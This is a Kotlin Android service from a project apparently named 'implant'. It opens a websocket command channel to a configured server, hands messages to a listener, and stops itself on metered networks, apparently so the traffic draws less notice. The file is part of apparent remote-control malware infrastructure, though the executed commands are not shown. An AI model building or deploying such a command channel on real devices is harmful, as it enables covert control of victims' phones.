package com.cooperthecoder.implant.command

import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.util.Log
import com.cooperthecoder.implant.App
import com.cooperthecoder.implant.Config
import com.cooperthecoder.implant.Networking
import okhttp3.Request
import okhttp3.WebSocket
import java.util.concurrent.TimeUnit

class CommandService : Service() {

    companion object {
        val TAG = CommandService::class.java.name
        const val WORKER_THREAD_NAME = "MeteredConnectionWorker"
        const val SOCKET_CLOSE = 1000
        val HEARTBEAT_INTERVAL = TimeUnit.SECONDS.toMillis(10)

        fun intent(context: Context): Intent {
            val intent = Intent(context, CommandService::class.java)
            return intent
        }
    }


    private var webSocket: WebSocket? = null
    val commandListener = CommandListener(this)

    lateinit var mainHandler: Handler

    val checkMeteredTask: Runnable = Runnable {
        if (Networking.isMeteredNetwork(this@CommandService)) {
            Log.d(TAG, "Metered network detected.")
            this@CommandService.onMeteredConnection()

        }

        Log.d(TAG, "Network still unmetered, checking again in $HEARTBEAT_INTERVAL ms")
        this@CommandService.heartbeat()
    }

    override fun onBind(intent: Intent): IBinder? {
        return null
    }

    override fun onStartCommand(intent: Intent, flags: Int, startId: Int): Int {
        if (!commandListener.isRunning()) {
            Log.d(TAG, "Opening websocket")
            openCommandChannel()
        } else {
            Log.d(TAG, "Websocket connection already open.")
        }
        return START_NOT_STICKY
    }

    override fun onDestroy() {
        closeCommandChannel()
        Log.d(TAG, "Command listener stopped.")
        super.onDestroy()
    }

    private fun openCommandChannel() {
        val request = Request.Builder()
                .url(Config.WEBSOCKETS_ENDPOINT)
                .build()

        webSocket = (application as App).httpClient.newWebSocket(request, commandListener)
        mainHandler = Handler()
        heartbeat()

    }

    private fun heartbeat() {
        mainHandler.postDelayed(checkMeteredTask, HEARTBEAT_INTERVAL)
    }


    private fun closeCommandChannel() {
        webSocket?.close(SOCKET_CLOSE, null)
    }

    private fun onMeteredConnection() {
        Log.d(TAG, "Network is metered. Stopping CommandService.")
        mainHandler.removeCallbacks(checkMeteredTask)
        stopSelf()
    }
}

